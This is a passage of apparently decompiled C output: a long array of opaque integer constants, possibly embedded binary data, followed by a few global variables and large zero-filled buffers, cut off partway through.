  2047018106,
  -1912929524,
  1053877,
  -1995470080,
  1334460750,
  1213106180,
  53394825,
  1065353216,
  50755049,
  -947715713,
  2139186693,
  1968265214,
  2139317767,
  -2055995389,
  1612466817,
  -1913651200,
  1053877,
  528860928,
  1207959554,
  -956301309,
  234373,
  1261056,
  -1982713088,
  154773,
  -1223689216,
  1418531920,
  -1031538672,
  -1962243288,
  -818214790,
  -108592522,
  -1089713661,
  896,
  160232,
  -1961790464,
  -114609030,
  55115649,
  -1945174016,
  361,
  817795,
  23036943,
  -108593152,
  -953926653,
  7,
  149521152,
  60001595,
  108789760,
  60001675,
  -1926692864,
  915,
  -2096869495,
  2025523399,
  185742422,
  1460630747,
  51149355,
  2083193978,
  2072577060,
  -1115070472,
  604,
  323263885,
  -214237184,
  12748559,
  -949616640,
  1364721223,
  1612466817,
  -1947205632,
  1586047064,
  2049663034,
  75105036,
  539261995,
  52673929,
  -947716096,
  880707847,
  10520715,
  -922025984,
  -108305292,
  141800845,
  -404226048,
  738197498,
  2047018106,
  612107020,
  871861024,
  -1376713783,
  -1951543157,
  149521352,
  1959922680,
  1926904633,
  -1031712020,
  4096,
  2002442811,
  870961632,
  1727695808,
  1958742957,
  268379421,
  -805109760,
  -394017909,
  1926249219,
  146834183,
  74633275,
  -538781813,
  -949892853,
  1450715200,
  1969230388,
  676890910,
  878082235,
  -385628654,
  539261995,
  51149355,
  2016085114,
  99582760,
  1627487113,
  35620295,
  3670016,
  727711744,
  2047020154,
  -1961194748,
  -164427654,
  58122043,
  54983559,
  147031001,
  91676475,
  -348358653,
  1962281975,
  -1980004606,
  142248218,
  -2119896223,
  4201546,
  1652637696,
  -517120228,
  322877951,
  283312128,
  59880,
  1468337920,
  -369098754,
  -438,
  -1248985293,
  2163,
  -394776,
  51022847,
  1485505610,
  1993030480,
  945292037,
  1485436907,
  139103056,
  990661123,
  1913136204,
  608995588,
  -967418360,
  -1918362554,
  193681496,
  63386339,
  0,
  136596619,
  870961489,
  112660434,
  -1031024637,
  -7551,
  -390004736,
  1188037392,
  -1947540922,
  283689410,
  1505887078,
  59359491,
  878082236,
  1076897810,
  872415280,
  3165744,
  3167744,
  0,
  3165696,
  3167744,
  0,
  1380272896,
  860636494,
  1818504754,
  108,
  1701597952,
  28773,
  1769489664,
  1869762676,
  1936942435,
  18696,
  760,
  -10447361,
  -1778384897,
  -184,
  1778412120,
  1962889216,
  -1778447324,
  -200,
  -14404353,
  -52075,
  -1924114177,
  1045661,
  -1014803712,
  -1014803704,
  -11513080,
  -44907,
  1217789951,
  -1,
  -47979,
  1690907647,
  1499005327,
  15254369,
  1476395008,
  1352941709,
  270812299,
  12091535,
  -1070399488,
  -896835389,
  -1248985293,
  2163,
  -452376,
  1640643583,
  1207959747,
  1610672896,
  59548,
  861732864,
  321782,
  1901527040,
  1784021099,
  179616258,
  -755009559,
  494190603,
  1784043094,
  431640578,
  -8918832,
  1958742994,
  -129645044,
  258510144,
  -13647741,
  1751227856,
  305419896,
  385876163,
  1414619136,
  6832234,
  1392508944,
  647364439,
  1509949434,
  -1017004021,
  1835008,
  545686925,
  1365245952,
  1073768532,
  1397751808,
  714473303,
  1509949434,
  -1017004021,
  1179648,
  1364480352,
  -11054256,
  -381291,
  -1072997889,
  50017,
  -396361182,
  0,
  -1249028771,
  517,
  1693856598,
  -1989921025,
  1572179238,
  1459617791,
  -494616,
  -1920245505,
  -1510,
  -1954067063,
  -384371,
  1988987391,
  -385875969,
  4,
  7041367,
  6969183,
  -771816854,
  158646283,
  110493520,
  -335544326,
  1789048878,
  -930414592,
  -130304627,
  183042047,
  1962934264,
  -125043686,
  -1196703693,
  4926,
  1958055339,
  -201326601,
  -826963548,
  1627389962,
  31630729,
  1972174848,
  -136320855,
  -2079326209,
  333,
  1972196183,
  -137369404,
  2021720063,
  -2079348708,
  313,
  -1474543418,
  4194489,
  -462058240,
  -543512,
  -1915188225,
  196533,
  -139991040,
  -629866497,
  -1926727541,
  209333,
  -141039616,
  -921960449,
  2055981172,
  -1531082492,
  -1962934271,
  139103034,
  41351483,
  -1115041913,
  426,
  -108803541,
  -494792888,
  -1962934272,
  32904,
  1959332608,
  1398758297,
  -1924015869,
  1458095221,
  1392508919,
  168670605,
  1256718336,
  268435447,
  -511653194,
  -1956750785,
  350979032,
  348357457,
  -485733493,
  -836022236,
  1073805697,
  426967040,
  -402127733,
  2088,
  1702065469,
  -579512206,
  2360519,
  -1962934256,
  1485527491,
  605815568,
  -1451913901,
  -589592,
  -1921878785,
  -152517515,
  -1946157066,
  1001258224,
  -349051,
  990672127,
  -348027,
  184841471,
  -2081693504,
  -1073019666,
  -293403787,
  -1996059900,
  1552654405,
  -1014954972,
  305419896,
  1450754945,
  512299572,
  -391547507,
  -2379,
  -2054346892,
  -163,
  -1923528598,
  -1561795467,
  1962934262,
  -2054333676,
  8326,
  4096,
  16,
  807219223,
  19592,
  888,
  4194489,
  -462058240,
  -619288,
  1450753279,
  -1249045964,
  2573,
  -623384,
  -1989779713,
  -1779893162,
  1694498806,
  429927,
  1633574400,
  59587,
  -1923612672,
  -1957636288,
  -1894767548,
  47232,
  -1010814208,
  3276800,
  59488,
  -1956839424,
  -507763,
  -1928666113,
  921186421,
  -335544330,
  -1178586345,
  20000,
  -1929068413,
  43189,
  -165681152,
  -253558785,
  50017,
  1784676468,
  -16619008,
  -507755,
  1958743039,
  -1114812317,
  24260,
  19400647,
  1347878912,
  -129722881,
  -1072955393,
  -1920252812,
  2212,
  -1923669277,
  182985823,
  1543503872,
  1819310181,
  1919251055,
  -1249026304,
  1895,
  -669464,
  242573311,
  -1928837237,
  43189,
  -172496896,
  1348009983,
  -1778429865,
  -1976,
  -1778403093,
  -2080,
  50017,
  1348468781,
  -9961366,
  -16777201,
  -521067,
  1958743039,
  -1147711464,
  4194304,
  -36391539,
  2062090239,
  -11,
  -532331,
  12804607,
  1358966272,
  -2123970253,
  1968852283,
  1011059488,
  -2123971837,
  1967476792,
  390133268,
  1393456416,
  -2141431670,
  -75432221,
  24468226,
  1506347841,
  620757187,
  -1223732992,
  1418531920,
  -1223690224,
  1228998216,
  -1031597853,
  74615592,
  -210567621,
  -147115517,
  -921965194,
  1560658777,
  -1251671949,
  1560632581,
  -860827560,
  -1257939708,
  -1560631292,
  -1250678648,
  -1560630788,
  1573578888,
  -1276289787,
  -788880655,
  1560562608,
  -1444498171,
  -393698566,
  -1560631023,
  1517805704,
  1673288965,
  -1593484010,
  -794710446,
  1560539312,
  -1446595323,
  -799366406,
  1561246642,
  193739525,
  -1445743111,
  -1350327558,
  1357113992,
  -731685627,
  -1729257133,
  1023058673,
  1520889283,
  -313619200,
  -1331237466,
  -342861781,
  1733225894,
  1616450130,
  307395355,
  94448217,
  715582904,
  312928737,
  793776592,
  715889063,
  298848929,
  -371119538,
  -307827267,
  -1951487391,
  710585185,
  -307830303,
  793776880,
  715692452,
  -1947146783,
  -1436439711,
  -307883606,
  -312112039,
  -1929362522,
  -307827378,
  707244710,
  307829245,
  -1717096624,
  1806264225,
  -501158679,
  -1292871744,
  -269392704,
  -1717293232,
  1713146798,
  -1171289256,
  -354342236,
  -486543924,
  -1717424304,
  -354342239,
  -499768171,
  107922375,
  -301072265,
  107873902,
  -1257010381,
  260501989,
  -1953367654,
  107714523,
  -172626322,
  -454100591,
  -961770387,
  1642988942,
  1097253245,
  319391357,
  321457833,
  -1049206290,
  -1938407066,
  -2039668056,
  244718601,
  -424797143,
  420054637,
  422121129,
  67089379,
  -1736046994,
  -1936590435,
  -2039668056,
  244719881,
  -424795863,
  705267309,
  707333801,
  -1551437339,
  1737619869,
  1708934339,
  1144267776,
  433865948,
  1103819089,
  775177436,
  -1306281169,
  1453868318,
  -1235631785,
  -1050952925,
  -1155287479,
  -1235631781,
  -246301917,
  -1155287427,
  -991975844,
  1277445818,
  -1508096374,
  -2080717601,
  -1571007788,
  1075496900,
  1276863068,
  1192937450,
  1276863068,
  1277068778,
  -841317742,
  20488,
  888,
  819824170,
  -1009089825,
  90031037,
  95749167,
  1482491229,
  28684496,
  129303901,
  -2002584914,
  -90112280,
  -139792990,
  -1868367198,
  -89984930,
  -1941770852,
  89681624,
  28410973,
  -111344292,
  -2133539474,
  89982483,
  3309780,
  -1868429987,
  -89984606,
  102924500,
  -155908771,
  -1906506401,
  72969633,
  1862927709,
  -221709731,
  -308086103,
  89982709,
  -1247628128,
  -101452031,
  89932443,
  90010549,
  -1410824099,
  -312670887,
  -89983028,
  -2057377827,
  299198111,
  1100637049,
  90637433,
  -1912332489,
  -1868410460,
  -89984602,
  204408417,
  2752865,
  89999285,
  559517533,
  2137114019,
  1693255467,
  -1904672299,
  914745234,
  83160477,
  959907165,
  119926018,
  624231773,
  -94567149,
  -89527608,
  -400012638,
  1812635318,
  628045363,
  1781492251,
  1400732968,
  1701653356,
  561607120,
  90047157,
  105901405,
  1508181341,
  -1367921801,
  -2064202386,
  89933233,
  -1092056995,
  1365050693,
  -758580725,
  1168308905,
  72122706,
  1427440989,
  24723882,
  89985629,
  98467922,
  -1311767203,
  89943417,
  127921501,
  -318110371,
  89982865,
  89915876,
  -1358842531,
  830042576,
  -1582431274,
  -1399983613,
  89992051,
  -1405404631,
  1411974515,
  24723882,
  89982285,
  246762537,
  2002584925,
  623146812,
  1613327124,
  -1912470225,
  -1328524413,
  89981299,
  -89354827,
  136928162,
  -2081912821,
  -312670887,
  -89983964,
  -1137741565,
  89982041,
  -103357322,
  1169531310,
  -2069693790,
  89915801,
  -234361251,
  117697933,
  -1194326691,
  89982825,
  -150730697,
  548893170,
  94567074,
  1965778016,
  948138333,
  86729779,
  -69807575,
  90123957,
  -115700131,
  90122933,
  1618163805,
  355033125,
  1714301792,
  -212569809,
  -89248296,
  136840866,
  -1328481322,
  -89985020,
  -89390667,
  71167394,
  1104151901,
  165020025,
  -99854983,
  -89530680,
  178065058,
  -89918760,
  -624362846,
  -2069693783,
  89933209,
  1520329821,
  1680700220,
  1680826417,
  1681091120,
  1798598963,
  1802395954,
  1798207021,
  1798201391,
  1798661678,
  1680750446,
  1983148587,
  1664312382,
  1663661680,
  1697609072,
  85986790,
  358464605,
  -596245155,
  -462027985,
  -206152692,
  -428417954,
  -1999239881,
  -89984914,
  1426657726,
  70719031,
  -727578825,
  757646678,
  -261453610,
  566164130,
  -2005323306,
  -1034608351,
  85984602,
  2043695709,
  -2012605063,
  1297162529,
  1393165012,
  -984165214,
  181821736,
  298870206,
  89982416,
  -786828707,
  89982885,
  -2007600803,
  -307113703,
  -89982246,
  836126646,
  1907035785,
  -308048282,
  89982021,
  -308067626,
  89982017,
  -89982344,
  1677801565,
  623445341,
  88037728,
  -2075889315,
  89915825,
  -1449030051,
  1889341431,
  -124457561,
  -1042482526,
  89982041,
  -1912232513,
  -89637168,
  240838306,
  1432252829,
  -1042492254,
  90011733,
  -1724004804,
  89982389,
  -1868408739,
  -89983772,
  114452710,
  781553245,
  1705280662,
  2002585015,
  219712595,
  -64573232,
  0,
  494,
  -1481246046,
  -1734149454,
  -314718660,
  89982301,
  -1881108992,
  -89982292,
  -1976516982,
  -965343906,
  89977318,
  1534029661,
  78088406,
  230557021,
  89570790,
  1531539293,
  472893030,
  1398268828,
  -198733662,
  -761070942,
  -313048876,
  89982298,
  -90013515,
  -308386654,
  89982297,
  86339602,
  87511554,
  -1868429513,
  -89983981,
  220841302,
  935918093,
  -962397524,
  1659406365,
  -308086094,
  -89986440,
  -2133587927,
  89982119,
  1338571277,
  -962397524,
  89915876,
  -1092581283,
  1381827909,
  -972906066,
  -982625267,
  -1414530328,
  -972727278,
  1549365004,
  53429345,
  120217441,
  -845404839,
  1554835285,
  1409286339,
  15228928,
  1560281088,
  -1959218948,
  -999507,
  1961692159,
  -398243025,
  44,
  -544738933,
  9192,
  1793033984,
  -247769032,
  344594039,
  -967617997,
  1392521988,
  198573911,
  -2007344192,
  -764071148,
  -1017004021,
  868233815,
  -1359853111,
  1238497119,
  603979971,
  15228928,
  1560281088,
  3560,
  1835365376,
  1683763763,
  1633905772,
  -1923153821,
  1726521973,
  1644167150,
  918693059,
  606749696,
  2042766530,
  -729173699,
  75225917,
  657276492,
  654570755,
  747578638,
  -174390104,
  298276650,
  -906319902,
  1615581472,
  -1381748506,
  -617852857,
  -838777539,
  -1375704197,
  -830746989,
  1945539451,
  830750302,
  825020177,
  831798254,
  -1162099324,
  1336100200,
  -813969776,
  -1362214021,
  646197653,
  830743426,
  -2022626014,
  -70892758,
  629420427,
  -830724434,
  -1123103109,
  -62342114,
  1005465979,
  -981192300,
  1164098235,
  -829403229,
  1132187515,
  831233990,
  -1362214012,
  646197653,
  830743494,
  49946
}; // weak
int dword_4128F0 = 6044257; // weak
int dword_412900 = 1; // weak
CHAR byte_4131A0[44] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_4131CC = 0; // weak
char byte_4131D0[524288] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
